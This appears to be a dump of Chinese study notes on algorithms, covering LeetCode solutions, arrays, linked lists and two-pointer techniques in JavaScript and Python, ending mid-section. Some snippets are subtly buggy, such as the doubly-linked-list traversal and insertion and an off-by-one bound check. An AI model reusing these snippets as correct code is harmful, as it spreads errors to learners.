合并两个有序数组\n\n\n`#2024/07/28` `#leetcode`  `#算法/双指针` \n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n![image.png600](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281626632.png?imageSlim)\n\n> [!danger]\n> 注意：nums 后面会使用 `0` 占位\n\n## 解题思路\n\n- 双指针技巧，分别指向数组的最后一个元素\n- 注意题设中  `num1` 的长度一定大于 `num2`的长度\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} nums1\n * @param {number} m\n * @param {number[]} nums2\n * @param {number} n\n * @return {void} Do not return anything, modify nums1 in-place instead.\n */\nvar merge = function (nums1, m, nums2, n) {\n  let i = m - 1; // 实际长度，不包括占位\n  let p = nums1.length - 1; // 实际长度，包括占位 0 ，游标\n  let j = n - 1; // 实际长度\n\n  while (i >= 0 && j >= 0) {\n    // 即比较他们之间的最后一个，最后一个肯定是最大的嘛\n    if (nums1[i] > nums2[j]) {\n      nums1[p] = nums1[i];\n      i--;\n    } else {\n      nums1[p] = nums2[j];\n      j--;\n    }\n    p--;\n  }\n\n  // 一定是 j 最大\n  while (j >= 0) {\n    nums1[p] = nums2[j];\n    j--;\n    p--;\n  }\n\n};\n```\n\n## 参考\n\n- [https://leetcode.cn/problems/merge-sorted-array/?envType=study-plan-v2&envId=top-interview-150](https://leetcode.cn/problems/merge-sorted-array/?envType=study-plan-v2&envId=top-interview-150)\n\n","VvTA99Ye":"\n# 最近的请求次数\n\n`#2024/07/28` `#算法/列队` \n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600|616](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407280800350.png?imageSlim)\n\n## 解题思路\n\n使用列队：\n1. **初始化队列**：\n    - 使用一个`队列`来存储所有请求的时间。\n2. **处理每个 `ping(t)` 请求**：\n    - 将时间 `t` 入队。\n    - 遍历：从队列的前面（即最老的请求）开始检查，如果有请求已经不在 `[t-3000, t]` 这个时间范围，移除它们。\n    - 返回队列的长度。\n\n## 代码实现\n\n```javascript hl:15,14\nvar RecentCounter = function () {\n  // 使用队列来存储ping的时间\n  this.q = [];\n};\n\n/**\n * @description:在时间 t 时 ping了一下\n * @param {number} t\n * @return {number}\n */\nRecentCounter.prototype.ping = function (t) {\n  // 把当前的 t 入队\n  this.q.push(t);\n  // 如果队头小于 t - 3000，就删除队头，即只保留 3000 毫秒内的请求\n  while (this.q[0] < t - 3000) {\n    // t 是递增的，所以可以从队头删除 3000 毫秒之前的请求\n    this.q.shift();\n  }\n  // 返回队列的长度\n  return this.q.length;\n};\n```\n\n### 复杂度分析\n\n- **时间复杂度**：\n    - 每个请求最多只执行一次入队和一次出队操作，因此对于每个 `ping`请求，其操作的时间复杂度是 `O(1)`。\n    - 综上，处理 `n` 个 `ping` 请求的总时间复杂度是 `O(n)`。\n- **空间复杂度**：\n    - 队列在最坏情况下需要存储所有在时间范围 `[t-3000, t]` 内的请求。因此，空间复杂度是 `O(n)`，其中 `n` 是最大同时存在的请求数（理论上可看为所有请求数）\n\n## 错误记录\n\n> [!danger]\n>  每次入队后，还需要 while 遍历一遍保证每个元素都在 `3000ms` 内","FAoyRw2S":"\n# 腐烂的橘子\n\n`#leetcode`   `#2024/09/16`  `#算法`  `#图BFS` `#算法/图` `#迷宫问题` \n\n\n> 很类似[1926.  迷宫中离入口最近的出口](/post/FPyCQLm9.html) ，都是迷宫问题，BFS 问题，但这题的关键是，从哪里开始扩散？\n\n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240916091007.png)\n\n## 思路一\n\n关键点：\n- 并不知道应该从哪里开始向四周扩散，所以\n\t- 第一步需要标记烂橘子到烂橘子🍊`queue  队列`\n\t- 统计新鲜橘子🍊的个数\n\n\n\n## 代码实现\n\n\n关键点：17/18 行\n\n```javascript hl:17,18,59,60\n/**\n * @param {number[][]} grid\n * @return {number}\n */\nvar orangesRotting = function (grid) {\n  let m = grid.length;\n  let n = grid[0].length;\n  let dirs = [\n    [0, 1],\n    [0, -1],\n    [1, 0],\n    [-1, 0],\n  ];\n  let queue = []; // 用于存放腐烂的橘子\n  let visited = Array.from({ length: m }, () => Array(n).fill(false));\n  let fresh = 0;\n  // 初始化, 遍历，将腐烂的橘子加入队列, 并标记为已访问\n  // 并统计新鲜橘子的数量\n  for (let i = 0; i < m; i++) {\n    for (let j = 0; j < n; j++) {\n      if (grid[i][j] === 2) {\n        queue.push([i, j]);\n        visited[i][j] = true;\n      } else if (grid[i][j] === 1) {\n        fresh++;\n      }\n    }\n  }\n\n  let step = 0;\n  while (queue.length) {\n    let sz = queue.length;\n    step++;\n    for (let i = 0; i < sz; i++) {\n      //拿出一个烂橘子\n      let cur = queue.shift();\n      // 将烂橘子的四周的新鲜橘子变为烂橘子\n      for (let dir of dirs) {\n        let x = cur[0] + dir[0];\n        let y = cur[1] + dir[1];\n        // 如果新坐标 (x, y) 超出边界，或者遇到墙壁，或者已经访问过，都直接跳过\n        if (\n          x < 0 ||\n          x >= m ||\n          y < 0 ||\n          y >= n ||\n          visited[x][y] ||\n          grid[x][y] === 0\n        ) {\n          continue;\n        }\n        visited[x][y] = true;\n        // 将这个新鲜橘子加入烂橘子队列\n        queue.push([x, y]);\n        fresh--;\n      }\n    }\n  }\n  // 如果还有新鲜橘子，返回-1\n  // 如果没有新鲜橘子，返回步数\n  return fresh === 0 ? Math.max(0, step - 1) : -1;\n};\n\n```\n\n","gOXSycsr":"\n# 数组与链表\n\n`#2024/08/11` `#算法` `#数据结构` \n\n\n## 目录\n<!-- toc -->\n ## 目录 \n\n- [1.  数组：Python 描述](/post/vaWzilsL.html)\n- [2. 链表：Python 描述](/post/Xz1XYUYQ.html)\n- [3. 列表：Python 描述](/post/qDxIH4HS.html)\n- [4. 数组链表与内存缓存的关系](/post/bLoMlQVO.html)\n\n## 总结\n\n- 数组和链表是两种基本的数据结构，分别代表数据在计算机内存中的两种存储方式：连续空间存储和分散空间存储。两者的特点呈现出互补的特性。\n- 数组支持随机访问、占用内存较少；但插入和删除元素效率低，且初始化后长度不可变。\n- 链表通过更改引用（指针）实现高效的节点插入与删除，且可以灵活调整长度；但节点访问效率低、占用内存较多。常见的链表类型包括单向链表、环形链表、双向链表。\n- 列表是一种支持增删查改的元素有序集合，通常基于**动态数组**实现。它保留了数组的优势，同时可以灵活调整长度。\n- 列表的出现大幅提高了数组的实用性，但可能导致部分内存空间浪费。\n- **程序运行时，数据主要存储在内存中**。数组可提供更高的内存空间效率，而链表则在内存使用上更加灵活。\n- 缓存通过缓存行、预取机制以及空间局部性和时间局部性等数据加载机制，为 CPU 提供快速数据访问，显著提升程序的执行效率。\n- 由于数组具有更高的缓存命中率，因此它通常比链表更高效。在选择数据结构时，应根据具体需求和场景做出恰当选择。\n\n\n## 注意点\n\n- python 中的数字也被包装为对象，同 js，所以存储的是他的引用\n- 列表末尾添加元素时，如果涉及到数据搬运，那么复杂度就是 O(n) 而不是 O(1)\n- 数组存储在**栈**上和存储在**堆**上，对时间效率和空间效率是否有影响？\n\t- 存储在栈上和堆上的数组都被存储在连续内存空间内，数据操作效率基本一致。然而，栈和堆具有各自的特点，从而导致以下不同点。\n\t\t1. 分配和释放效率：\n\t\t\t1. 栈是一块较小的内存，分配由编译器自动完成；\n\t\t\t2. 而堆内存相对更大，可以在代码中动态分配，更容易碎片化。因此，堆上的分配和释放操作通常比栈上的慢。\n\t\t2. 大小限制：栈内存相对较小，堆的大小一般受限于可用内存。因此堆更加适合存储大型数组。\n\t\t3. 灵活性：栈上的数组的大小需要在编译时确定，而堆上的数组的大小可以在运行时动态确定。\n\n## 主要参考\n\n- 《hello，算法》\n- 《labuladong 算法笔记》","vaWzilsL":"\n# 数组：Python 描述\n\n`#数据结构/数组` \n\n\n## 目录\n<!-- toc -->\n ## 1. 初始化数组 \n\n```python\n##########################################################\n### 初始化数组\n##########################################################\n# [0] * 5 代表生成一个长度为 5 的数组，每个元素都是 0\n# list[int] 代表数组的元素类型是 int\narr: list[int] = [0] * 5  # [ 0, 0, 0, 0, 0 ]\n\n# 初始化数组\nnums: list[int] = [1, 3, 2, 5, 4]\n```\n\n## 2. 静态数组和动态数组\n\n- 静态数组：\n\t- 在创建的时候就要确定数组的元素类型和元素数量\n\t- 只有在 C++、Java、Golang 这类语言中才提供了创建静态数组的方式，\n- 动态数组：\n\t- 动态数组底层还是静态数组，只是**自动帮我们进行数组空间的扩缩容**，并把增删查改操作进行了封装，让我们使用起来更方便而已\n\t\t- 为什么要自动**缩容**\n\t\t\t- 为了避免资源浪费，我们其实可以适当缩小存储空间，这就是缩容\n\t\t- **扩缩容的策略**：\n\t\t\t- 当数组元素个数达到底层静态数组的容量上限时，扩容为原来的 2 倍；\n\t\t\t- 当数组元素个数缩减到底层静态数组的容量的 1/4 时，缩容为原来的 1/2。\n\t- 类似 Python、JavaScript 这类语言并没有提供静态数组的定义方式\n\n\n## 3. 静态数组的增删改查\n\n数据结构的职责就是**增删查改**，下面分别展开说\n### 3.1. 访问元素\n\n**索引本质上是内存地址的偏移量**，如下图：\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240919074324.png)\n\n#### 3.1.1. 可以以 O(1) 时间复杂度访问数组元素\n\n```python\nimport random\n\n##########################################################\n### 以 O(1) 时间复杂度访问数组元素\n##########################################################\n# 以 O(1) 时间复杂度访问数组元素\n\ndef random_access(nums: list[int]) -> int:\n    random_index: int = random.randint(0, len(nums) - 1)\n    return nums[random_index]\n\n# 测试\nnums = [1, 2, 3, 4, 5]\nprint(random_access(nums))  # 随机输出 nums 中的一个元素\n\n```\n\n\n### 3.2. 插入元素\n\n需要将该元素之后的所有元素都向后移动一位，之后再把元素赋值给该索引，如下图：\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240919074702.png)\n\n#### 3.2.1. 以 `O(n)` 时间复杂度插入元素\n\n```python\n##########################################################\n### 以 O(n) 时间复杂度插入元素\n##########################################################\n\n# 以 O(n) 时间复杂度插入元素\ndef insert(arr:list[int], num:int, index:int):\n    \"\"\"将 num 插入到 arr 的 index 位置\"\"\"\n    # 每个元素向后移动一位\n    for i in range(len(arr)-1, index, -1):\n        arr[i] = arr[i-1]\n    # 将 num 插入到 index 位置\n    arr[index] = num\n```\n#### 3.2.2. range 函数详解\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240919075539.png)\n\n\n### 3.3. 删除元素\n\n想删除索引 `i` 处的元素，则需要把索引 `i` 之后的元素都向前移动一位，如下图\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240919075947.png)\n\n\n#### 3.3.1. 以 O(n) 时间复杂度删除元素\n\n```python\n##########################################################\n### 以 O(n) 时间复杂度删除元素\n##########################################################\n\ndef remove(nums:list[int],index:int):\n    # 把索引 index 之后的元素向前移动一个位置\n    for i in range(index,len(nums)-1):\n        nums[i] = nums[i+1]\n\n```\n### 3.4. 数组的插入与删除操作的缺点\n\n总的来看，数组的插入与删除操作有以下缺点。\n- **时间复杂度高**：数组的插入和删除的平均时间复杂度均为 O(n) ，其中 n 为数组长度。\n- **丢失元素**：由于**数组的长度不可变**，因此在插入元素后，超出数组长度范围的元素会丢失。\n- **内存浪费**：我们可以初始化一个比较长的数组，只用前面一部分，这样在插入数据时，丢失的末尾元素都是“无意义”的，但这样做会造成部分内存空间浪费。\n\n### 3.5. 遍历数组的三种方式\n\n```python\n##########################################################\n### 遍历数组的三种方式\n##########################################################\n\ndef traverse(arr):\n    # ① 直接遍历数组\n    for i in arr:\n        print(i)\n    # ② 使用 range 通过所以遍历数组\n    for i in range(len(arr)):\n        print(arr[i])\n    # ③ 使用 enumerate 遍历数组\n    for i, v in enumerate(arr):\n        print(i, v)\n\n```\n\n### 3.6. 查找元素\n\n```python\n##########################################################\n### 查找元素，复杂度O(n)  \n##########################################################\n\ndef find(nums:list[int],target:int)->int:\n    for i in range(len(nums)):\n        if nums[i]==target:\n            return i\n    return -1\n\n```\n\n### 3.7. 总结\n\n综上，静态数组的增删查改操作的时间复杂度是：\n- 增：\n    - 在末尾追加元素：`O(1)`。\n    - 在中间（非末尾）插入元素：`O(N)`。\n- 删：\n    - 删除末尾元素：`O(1)`。\n    - 删除中间（非末尾）元素：`O(N)`。\n- 查：给定指定索引，查询索引对应的元素的值，时间复杂度 `O(1)`。\n- 改：给定指定索引，修改索引对应的元素的值，时间复杂度 `O(1)`。\n\n## 4. 扩容数组，复杂度O(n) \n\n```python\n##########################################################\n### 扩容数组，复杂度O(n)                                ###\n##########################################################\n\n# 如果数组长度小于size，就在数组后面补0\ndef expandArray(arr, size):\n    if len(arr) < size:\n        # 这个写法牛逼啊\n        arr += [0] * (size - len(arr))\n    return arr\n\n# 扩容数组，enlarge为扩容的个数\ndef expand(nums:list[int],enlarge:int) -> list[int]:\n    # 初始化一个新的数组，长度为原数组长度加上enlarge\n    res = [0] * (len(nums) + enlarge)\n    # 将原数组的元素复制到新数组中\n    for i in range(len(nums)):\n        res[i] = nums[i]\n    # 返回新数组\n    return res\n```\n\n为什么要扩容：在大多数编程语言中，**数组的长度是不可变的**\n\n\n## 5. 数组的优点与局限性\n\n\n- **空间效率高**：数组为数据分配了连续的内存块，无须额外的结构开销。\n- **支持随机访问**：数组允许在 `O(1)` 时间内访问任何元素。\n- **缓存局部性**：当访问数组元素时，计算机不仅会加载它，还会缓存其周围的其他数据，从而借助高速缓存来提升后续操作的执行速度。\n\n连续空间存储是一把双刃剑，其存在以下局限性。\n\n- **插入与删除效率低**：当数组中元素较多时，插入与删除操作需要移动大量的元素。\n- **长度不可变**：数组在初始化后长度就固定了，扩容数组需要将所有数据复制到新数组，开销很大。\n- **空间浪费**：如果数组分配的大小超过实际所需，那么多余的空间就被浪费了。\n\n## 6. 数组的重要性\n\n- 数据结构底层就两个，数组就是其中一个，他会用来实现各类上层数据结构\n-  **机器学习**：神经网络中大量使用了向量、矩阵、张量之间的线性代数运算，这些数据都是以数组的形式构建的。数组是神经网络编程中最常使用的数据结构。\n\n\n\n\n","F9KXXAYE":"\n# 数组与链表：JavaScript 描述\n\n\n> 这是`最基本、最底层`的两种存储结构\n\n\n## 目录\n<!-- toc -->\n ## 1. 快速概览 \n\n数组和链表 是所有数据结构的【基础】\n数据结构种类很多，甚至你也可以发明自己的数据结构，但是底层存储无非数组或者链表，\n\n### 1.1. 数组 \n\n- 访问高效，能够随机访问，访问时间复杂度 `O(1)` \n\t- 我们知道 计算机内存空间不是连续的 ，  **怎么实现能够随机访问的呢**？ →  三个条件\n\t\t- 第一个`内存地址`我们知道，即数组名 指向的地址\n\t\t- 地址紧凑存储 （但维护他就有成本，比如删除，涉及到数据搬移）\n\t\t- 索引为 `int` ，即每个字字节大小确定\n\t- 由于是紧凑连续存储, 可以`随机访问`，通过索引快速找到对应元素，而且相对节约存储空间。\n- 缺点是低效的 `插入和删除`\n\t- 因为层需要大量的 `数据搬迁` 来保持数据的连续性； \n\t- 即维护它需要成本，因为连续存储，内存空间必须一次性分配够，所以说数组如果要扩容，需要重新分配一块更大的空间，再把数据全部复制过去，时间复杂度` O(N)`； \n\t- 而且你如果想在数组中间进行插入和删除，每次必须搬移后面的所有数据以保持连续，时间复杂度 `O(N)`。\n\t\t- 插入：从最好 `O(1)` ，最坏 `O(n)` ，平均 `O(n)`\n\t\t- 删除：从最好 `O(1)` ，最坏 `O(n) `，平均 `O(n)`\n\n### 1.2. 链表\n\n- 链表 \n\t- 元素不连续，而是靠指针指向下一个元素的位置，所以不存在数组的`扩容问题`；\n\t- 如果知道某一元素的`前驱和后驱`，操作指针即可删除该元素或者插入新元素，时间复杂度 `O(1)`。\n\t- 但是正因为存储空间不连续，你无法根据一个索引算出对应元素的地址，所以`不能随机访问`；\n\t- 而且由于每个元素必须存储指向前后元素位置的指针，会`消耗相对更多的储存空间`。\n\n## 2. 数组\n\n### 2.1. 如何自己实现一个 Array ？\n\n- 需要注意的点：\n\t- 插入缝隙，`size`和 `length` 属性不一样；\n\t\t- `length` 代表真正的数组元素个数\n\t\t- `size` 代表缝隙数，方便插入或者删除的时候方便 \n- 数组的扩容与缩容时，因为内存空间并不是连续的，而数组是 紧凑连续存储， 为了维护连续性，需要重新申请内存地址。\n\n### 2.2. 问：如何使用 JS/TS实现 Array 的一些常用方法呢？ \n\n- 可参考 v8 Array implementation\n- 或者：[https://github.com/zloirock/core-js#ecmascript-array](https://github.com/zloirock/core-js#ecmascript-array)\n\n## 3. 链表数据结构\n\n- 不支持 随机访问，如果需要找特定项，需要从头开始找，所以访问的时间复杂度为`O(n)`\n- 高效的插入和删除，表中`插入和删除`一个数据是非常快速的，时间复杂度为 `O(1)` \n\n### 3.1. 如何实现一个链表数据结构呢？\n\n注意点：\n- 哨兵节点技巧：`head` `tail` 是技巧，可以理解为占位符\n\t- `head`一直指向第一个\n\t- `tail`一直指向最后一个\n- 在后面很有用\n\n### 3.2. 单链表\n\n![image.png|528](https://832-1310531898.cos.ap-beijing.myqcloud.com/0542898d8fa6d910736fb27fba9b60f6.png)\n\n```javascript\n// Node 类 \nexport class Node {\n  constructor(element, next) {\n    this.element = element;\n    this.next = next;\n  }\n}\n\nexport default class LinkedList {\n  constructor() {\n    this.count = 0;\n    this.head = null;\n  }\n\n  push(element) {\n    const node = new Node(element);\n    let current;\n    if (this.head == null) {\n      this.head = node;\n    } else {\n      current = this.head;\n      while (current.next != null) {\n        current = current.next;\n      }\n      current.next = node;\n    }\n    this.count++;\n  }\n\n  getElementAt(index) {\n    if (index >= 0 && index <= this.count) {\n      let node = this.head;\n      for (let i = 0; i < index && node != null; i++) {\n        node = node.next;\n      }\n      return node;\n    }\n    return null;\n  }\n\n  insert(element, index) {\n    if (index >= 0 && index <= this.count) {\n      const node = new Node(element);\n      if (index === 0) {\n        const current = this.head;\n        node.next = current;\n        this.head = node;\n      } else {\n        const previous = this.getElementAt(index - 1);\n        node.next = previous.next;\n        previous.next = node;\n      }\n      this.count++;\n      return true;\n    }\n    return false;\n  }\n\n  removeAt(index) {\n    if (index >= 0 && index < this.count) {\n      let current = this.head;\n      if (index === 0) {\n        this.head = current.next;\n      } else {\n        const previous = this.getElementAt(index - 1);\n        current = previous.next;\n        previous.next = current.next;\n      }\n      this.count--;\n      return current.element;\n    }\n    return undefined;\n  }\n\n  remove(element) {\n    const index = this.indexOf(element);\n    return this.removeAt(index);\n  }\n\n  indexOf(element) {\n    let current = this.head;\n    for (let i = 0; i < this.size() && current != null; i++) {\n      if (element === current.element) {\n        return i;\n      }\n      current = current.next;\n    }\n    return -1;\n  }\n\n  isEmpty() {\n    return this.size() === 0;\n  }\n\n  size() {\n    return this.count;\n  }\n\n  getHead() {\n    return this.head;\n  }\n\n  clear() {\n    this.head = undefined;\n    this.count = 0;\n  }\n\n  toString() {\n    if (this.head == null) {\n      return '';\n    }\n    let objString = `${this.head.element}`;\n    let current = this.head.next;\n    for (let i = 1; i < this.size() && current != null; i++) {\n      objString = `${objString},${current.element}`;\n      current = current.next;\n    }\n    return objString;\n  }\n}\n```\n\n通过控制打印，就能看出对于JS来说，链表数据就是对象，里面存储这 `next` 属性。\n\n![image.png|472](https://832-1310531898.cos.ap-beijing.myqcloud.com/389820c4f9173393d6149c2491f7b31b.png)\n\n### 3.3. 双向链表\n\n![image.png|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/8f6dc869c193063aad199bcc490cd88e.png)\n\n![image.png|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/4c700a89c496baf7fd654ed318a75acb.png)\n\n![image.png|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/217f996a736b94f64b1fbed202804866.png)\n\n### 3.4. 循环列表\n\n![image.png|472](https://832-1310531898.cos.ap-beijing.myqcloud.com/5975cb8f5b90f5e00b94c59eed80e557.png)\n\n","Xz1XYUYQ":"\n# 链表：Python 描述\n\n\n`#数据结构/链表` `#数据结构` \n\n\n## 目录\n<!-- toc -->\n ## 1. 链表的分类 \n\n- 单链表\n- 环形链表\n- 双向链表\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240920060109.png)\n\n## 2. 链表的存储是分散的\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240919215701.png)\n\n尾节点指向的是空\n- JS 中被记为 null\n- Python 中分别被记为  `None`\n\n## 3. 链表的好处\n\n- 不需要考虑扩**缩容和数据搬移**的问题，用的时候就能接上，不用的时候拆掉就行了\n- 所以，比数组要节省内存\n\n## 4. 单链表节点的增删改查\n\n```python\nclass ListNode:\n    def __init__(self,val:int) -> None:\n        # 节点值\n        self.val = val\n        # listNode | Node 代表 self.next 的值可能是 listNode | Node\n        self.next:ListNode | None = None\n```\n\n### 4.1. 初始化\n\n```python\nn0 = ListNode(0)\nn1 = ListNode(1)\nn2 = ListNode(2)\nn3 = ListNode(3)\nn4 = ListNode(4)\n\nn0.next = n1\nn1.next = n2\nn2.next = n3\nn3.next = n4\n# 最后一个节点的 next 指向 None\nn4.next = None\n```\n\n### 4.2. 单链表的遍历：查或改\n\n```python\n############################################\n# 单链表的遍历：查或改\n############################################\np = n0\nval = 2\nwhile p is not None:\n    print(p.val)\n    if p.val == val:\n        ## 修改为 20\n        p.val = 20\n    p = p.next\n```\n\n### 4.3. 单链表的插入\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921062239.png)\n\n#### 4.3.1. 头部插入\n\n```python\n####### 头部插入\np = n0\nn5 = ListNode(5)\nn5.next = p\n# 变成了 n5 -> n0 -> n1 -> n2 -> n3 -> n4\n# 即 5 -> 0 -> 1 -> 2 -> 3 -> 4\n```\n\n#### 4.3.2. 尾部插入\n\n```python\n###### 尾部插入\np = n0\nn5 = ListNode(5)\nwhile p.next is not None:\n    p = p.next\np.next = n5\n# 变成了 n0 -> n1 -> n2 -> n3 -> n4 -> n5\n# 即 0 -> 1 -> 2 -> 3 -> 4 -> 5\n```\n\n#### 4.3.3. 中间插入\n\n```python\n###### 中间插入\n# 需要插入的节点\nn5 = ListNode(5)\n# 需要插入的位置\npos = 2\n# 头结点\np = n0\nwhile pos > 0 and p.next is not None:\n    p = p.next\n    pos -= 1\n\n# 将 n5 的 next 指向 p 的 next\nn5.next = p.next\n# 将 n5 插入到 p 的后面\np.next = n5\n```\n### 4.4. 单链表的删除\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240920053643.png)\n\n```python\n# 需要删除的节点的值\nval = 2\n# 头结点\np = n0\n# 删的第一步是查\n# 查找到需要删除的节点的前一个节点\nwhile p.next is not None:\n    # 如果下一个节点的值等于 val，将下一个节点删除\n    if p.next.val == val:\n        p.next = p.next.next\n    else:\n        p = p.next\n```\n\n## 5. 双向链表节点的增删改成\n\n```python\n# 双链表节点\nclass Node:\n    def __init__(self, prev, val:int, next) -> None:\n        # 节点值\n        self.val = val\n        # 前一个节点\n        self.prev = prev\n        # 后一个节点\n        self.next = next\n```\n\n### 5.1. 初始化\n\n```python\n# 创建双链表\nn0 = Node(None, 0, None)\nn1 = Node(n0, 1, None)\nn2 = Node(n1, 2, None)\nn3 = Node(n2, 3, None)\n\n# 连接双链表\n# n0 -> n1 -> n2 -> n3\nn0.next = n1\nn1.next = n2\nn2.next = n3\nn3.next = None\n# n0 <- n1 <- n2 <- n3\nn3.prev = n2\nn2.prev = n1\nn1.prev = n0\nn0.prev = None\n\n# 最终\n# Node <- n0 <-> n1 <-> n2 <-> n3 -> None\n```\n### 5.2. 遍历\n\n```python\n############################################\n# 双链表的查：遍历\n# ############################################\n\n# 向后遍历\np = n0\nwhile p is not None:\n    p = p.next\n    print(p.val)\n\n# 向前遍历\np = n3\nwhile p is not None:\n    p = p.prev\n    print(p.val)\n```\n\n### 5.3. 插入\n\n```python\n############################################\n# 双链表的插入:插\n# ############################################\n\n# 需要插入的节点\nn4 = Node(None, 4, None)\n# 需要插入的位置\npos = 2\n# 头结点\np = n0\n\n# 查找到需要插入的位置\nwhile pos > 0 and p.next is not None:\n    pos -= 1\n    p = p.next\n\n# 将 n5 的 prev 指向 p\nn4.prev = p\n# 将 n5 的 next 指向 p 的 next\nn4.next = p.next\n```\n\n### 5.4. 删除\n\n```python\n############################################\n# 双链表的删除\n# ############################################\n\n# 需要删除的节点\ndel_node = n2\n# 将 n2 的前一个节点的 next 指向 n2 的下一个节点\ndel_node.prev.next = del_node.next\n# 将 n2 的下一个节点的 prev 指向 n2 的前一个节点\ndel_node.next.prev = del_node.prev\n```\n\n\n## 6. 链表的使用场景\n\n### 6.1. 单向链表\n\n单向链表通常用于实现栈、队列、哈希表和图等数据结构。\n- **栈与队列**：\n\t- 当**插入和删除**操作都在链表的一端进行时，它表现的特性为先进后出，对应栈；\n\t- 当**插入操作**在链表的一端进行，**删除操作**在链表的另一端进行，它表现的特性为先进先出，对应队列。\n- **哈希表**：链式地址是**解决哈希冲突**的主流方案之一，在该方案中，所有冲突的元素都会被放到一个链表中。\n- **图**：**邻接表**是表示图的一种常用方式，其中图的每个顶点都与一个链表相关联，链表中的每个元素都代表与该顶点相连的其他顶点。\n\n### 6.2. 双向链表\n\n双向链表常用于需要快速查找前一个和后一个元素的场景。\n- **高级数据结构**：比如在红黑树、B 树中，我们需要访问节点的父节点，这可以通过在节点中保存一个指向父节点的引用来实现，类似于双向链表。\n- **浏览器历史**：在网页浏览器中，当用户点击前进或后退按钮时，浏览器需要知道用户访问过的前一个和后一个网页。双向链表的特性使得这种操作变得简单。\n- **LRU 算法**：在缓存淘汰（LRU）算法中，我们需要快速找到最近最少使用的数据，以及支持快速添加和删除节点。这时候使用双向链表就非常合适。\n### 6.3. 环形链表\n\n环形链表常用于需要周期性操作的场景，比如操作系统的资源调度。\n- **时间片轮转调度算法**：在操作系统中，时间片轮转调度算法是一种常见的 CPU 调度算法，它需要对一组进程进行循环。每个进程被赋予一个时间片，当时间片用完时，CPU 将切换到下一个进程。这种循环操作可以通过环形链表来实现。\n- **数据缓冲区**：在某些数据缓冲区的实现中，也可能会使用环形链表。比如在**音频、视频播放器**中，数据流可能会被分成多个缓冲块并放入一个环形链表，以便实现无缝播放。\n\n\n## 7. 数组和链表的对比\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921062147.png)\n\n## 8. 技巧：虚拟头结点 & 虚拟尾节点\n\n我们会使用「虚拟头结点」技巧，把头、尾、中部的操作统一起来，同时还能避免处理头尾指针为空情况的边界情况\n\n### 8.1. 虚拟头尾节点技巧原理\n\n它的原理很简单，就是在创建双链表时就创建一个**虚拟头节点**和一个**虚拟尾节点**，无论双链表是否为空，这两个节点都存在。这样就不会出现空指针的问题，可以避免很多边界情况的处理\n### 8.2. 示例：双链表\n\n举例来说，假设虚拟头尾节点分别是 `dummyHead` 和 `dummyTail`，那么一条空的`双链表`长这样：\n\n```\ndummyHead <-> dummyTail\n```\n\n如果你添加 `1,2,3` 几个元素，那么链表长这样：\n\n```\ndummyHead <-> 1 <-> 2 <-> 3 <-> dummyTail\n```\n\n**你以前要把在头部插入元素、在尾部插入元素和在中间插入元素几种情况分开讨论，现在有了头尾虚拟节点，无论链表是否为空，都只需要考虑在中间插入元素的情况就可以了，这样代码会简洁很多**。\n\n### 8.3. 示例：单链表\n\n举例来说，假设虚拟头尾节点分别是 `dummyHead` 和 `dummyTail`，那么一条空的`单链表`长这样：\n\n```\ndummyHead -> dummyTail\n```\n\n如果你添加 `1,2,3` 几个元素，那么链表长这样：\n\n```\ndummyHead -> 1 -> 2 -> 3 -> dummyTail\n```\n\n**你以前要把在头部插入元素、在尾部插入元素和在中间插入元素几种情况分开讨论，现在有了头尾虚拟节点，无论链表是否为空，都只需要考虑在中间插入元素的情况就可以了，这样代码会简洁很多**。\n\n> 对于单链表，**虚拟头结点**有一定的简化作用，但**虚拟尾节点**没有太大作用\n\n### 8.4. 虚拟头尾节点的缺点\n\n当然，虚拟头结点会多占用一点内存空间，但是比起给你解决的麻烦，这点空间消耗是划算的。\n\n\n","yorwPeWb":"\n# 数组的双指针技巧\n\n`#算法/双指针`  `#算法/数组` \n\n## 目录\n<!-- toc -->\n ## 1. 概述 \n\n- 在处理 数组和链表相关问题时，双指针技巧`是经常用到的，分以下两种\n\t- 所谓**左右指针**，就是两个指针相向而行**或者**相背而行；\n\t- 而所谓**快慢指针**，就是两个指针同向而行，一快一慢。\n- 在数组中，把`索引`当做指针即可\n\n## 2. 快慢指针技巧\n\n### 2.1. [删除有序数组中的重复项](https://leetcode.cn/problems/remove-duplicates-from-sorted-array/)\n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/ce4b56d8a98411acaaae8cf1e7ae1c52.png)\n\n我们让慢指针 `slow` 走在后面，快指针 `fast` 走在前面探路，找到一个不重复的元素就赋值给 `slow` 并让 `slow` 前进一步。\n\n这样，就保证了 `nums[0..slow] `都是无重复的元素，当 `fast` 指针遍历完整个数组 nums 后，`nums[0..slow] `就是整个数组去重之后的结果。\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number}\n */\nvar removeDuplicates = function (nums) {\n    let slow = 0,\n        fast = 0;\n    for (let i = 0; i < nums.length; i++) {\n        fast = i;\n        if (nums[fast] !== nums[slow]) {\n           slow++;\n           nums[slow] = nums[fast];\n        }\n    }\n    return slow + 1;\n};\n```\n\n### 2.2. 